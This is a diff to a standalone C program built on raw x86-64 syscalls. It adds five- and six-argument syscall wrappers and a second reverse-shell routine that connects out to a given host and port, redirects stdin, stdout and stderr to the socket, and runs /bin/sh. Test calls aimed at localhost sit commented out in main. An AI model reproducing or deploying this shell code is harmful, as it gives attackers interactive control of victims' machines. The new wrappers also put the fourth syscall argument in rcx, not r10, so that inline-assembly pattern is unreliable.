@@ -109,6 +109,9 @@ struct sockaddr {
 // - Memory clobber is included because syscalls may modify memory
 // - Return value is always in rax register after syscall
 
+// Detailed documentation about GCC inline assembly:
+//https://www.felixcloutier.com/documents/gcc-asm.html
+
 static long
 syscall1(long sys_num, long a1)
 {
@@ -216,6 +219,50 @@ syscall4(long n, long a1, long a2, long a3, long a4)
     return ret;
 }
 
+static long
+syscall5(long n, long a1, long a2, long a3, long a4, long a5)
+{
+    long ret;
+    __asm__ __volatile__(
+        "mov rax, %[num]\n"
+        "mov rdi, %[a1]\n"
+        "mov rsi, %[a2]\n"
+        "mov rdx, %[a3]\n"
+        "mov rcx, %[a4]\n"
+        "mov r8, %[a5]\n"
+        "syscall\n"
+        : "=a"(ret)
+        : [num] "r"(n), [a1] "r"(a1), [a2] "r"(a2), [a3] "r"(a3), [a4] "r"(a4), [a5] "r"(a5)
+        : "rdi", "rsi", "rdx", "rcx", "r8", "r11", "memory"
+        // Clobber list: syscall modifies rdi, rsi, rdx, rcx, r8, r11
+        // Note: rcx is used for 4th parameter, but syscall also modifies it
+        // r11 is always modified by syscall instruction (flags register)
+    );
+    return ret;
+}
+
+static long
+syscall6(long n, long a1, long a2, long a3, long a4, long a5, long a6)
+{
+    long ret;
+    __asm__ __volatile__(
+        "mov rax, %[num]\n"
+        "mov rdi, %[a1]\n"
+        "mov rsi, %[a2]\n"
+        "mov rdx, %[a3]\n"
+        "mov rcx, %[a4]\n"
+        "mov r8, %[a5]\n"
+        "mov r9, %[a6]\n"
+        "syscall\n"
+        : "=a"(ret)
+        : [num] "r"(n), [a1] "r"(a1), [a2] "r"(a2), [a3] "r"(a3), [a4] "r"(a4), [a5] "r"(a5), [a6] "r"(a6)
+        : "rdi", "rsi", "rdx", "rcx", "r8", "r9", "r11", "memory"
+        // Clobber list: syscall modifies rdi, rsi, rdx, rcx, r8, r9, r11
+        // Note: rcx is used for 4th parameter, but syscall also modifies it
+        // r11 is always modified by syscall instruction (flags register)
+    );
+    return ret;
+}
 
 // ================== END OF SYSTEM CALL WRAPPERS ==================
 
@@ -644,7 +691,7 @@ reverse_shell(unsigned int ip, unsigned short port)
     __asm__ __volatile__(
         "xor rax, rax\n"
         "mov QWORD PTR [%0+8], rax\n"
-        :
+        :                               // No output operands
         : "r"(&addr)
         : "rax", "memory"
     );
@@ -693,7 +740,7 @@ reverse_shell(unsigned int ip, unsigned short port)
         "mov rdi, %[sockfd]\n"
         "mov rsi, 0\n"                  // STDIN_FILENO
         "syscall\n"
-        :
+        :                               // No output operands
         : [dup2_num] "i"(SYS_DUP2), [sockfd] "r"(sockfd)
         : "rax", "rdi", "rsi", "rcx", "r11", "memory"
     );
@@ -704,7 +751,7 @@ reverse_shell(unsigned int ip, unsigned short port)
         "mov rdi, %[sockfd]\n"
         "mov rsi, 1\n"                  // STDOUT_FILENO
         "syscall\n"
-        :
+        :                               // No output operands
         : [dup2_num] "i"(SYS_DUP2), [sockfd] "r"(sockfd)
         : "rax", "rdi", "rsi", "rcx", "r11", "memory"
     );
@@ -715,7 +762,7 @@ reverse_shell(unsigned int ip, unsigned short port)
         "mov rdi, %[sockfd]\n"
         "mov rsi, 2\n"                  // STDERR_FILENO
         "syscall\n"
-        :
+        :                               // No output operands
         : [dup2_num] "i"(SYS_DUP2), [sockfd] "r"(sockfd)
         : "rax", "rdi", "rsi", "rcx", "r11", "memory"
     );
@@ -736,13 +783,42 @@ reverse_shell(unsigned int ip, unsigned short port)
         "mov rsi, %[argv]\n"            // argv
         "mov rdx, 0\n"                  // envp = NULL
         "syscall\n"
-        :
+        :                               // No output operands
         : [execve_num] "i"(SYS_EXECVE), [path] "r"(sh_path), [argv] "r"(argv)
         : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
     );
     
     // Should never reach here, but just in case
     sys_exit(1);
+}
+
+
+static void
+reverse_shell2(unsigned int ip, unsigned short port)
+{
+    long sockfd;
+    struct sockaddr_in addr;
+    unsigned short port_net = port << 8 | port >> 8;
+    unsigned int ip_net = ip << 24 | ip >> 24 | (ip << 8 & 0x00FF0000) | (ip >> 8 & 0x0000FF00);
+    long connect_result;
+    addr.sin_family = 2;
+    addr.sin_port = port_net;
+    addr.sin_addr = ip_net;
+    memset(&addr.sin_zero, 0, sizeof(addr.sin_zero));
+    sockfd = syscall3(SYS_SOCKET, 2, 1, 6);
+    if (sockfd < 0) {
+        printf("Error: failed to create socket, status: %d\n", (int) sockfd);
+        sys_exit(1);
+    }
+    connect_result = syscall3(SYS_CONNECT, sockfd, (long int) &addr, 16);
+    if (connect_result < 0) {
+        printf("Error: failed to connect to remote host, status: %d\n", (int) connect_result);
+        sys_exit(1);
+    }
+    syscall2(SYS_DUP2, sockfd, 0);
+    syscall2(SYS_DUP2, sockfd, 1);
+    syscall2(SYS_DUP2, sockfd, 2);
+    syscall3(SYS_EXECVE, (long int) "/bin/sh", (long int) NULL, (long int) NULL);
 }
 
 // ================== END OF REVERSE SHELL IMPLEMENTATION ==================
@@ -798,8 +874,8 @@ main(int argc, char **argv)
     // Note: This function never returns (noreturn attribute)
     // The program will be replaced by /bin/sh process
     // ============================================================
-    // reverse_shell(0x7f000001, 31337);  // Uncomment to test
-
+    // reverse_shell(0x7f000001, 31337);   // Uncomment to test
+    // reverse_shell2(0x7f000001, 31337);  // Uncomment to test
     return 0;
 }
 
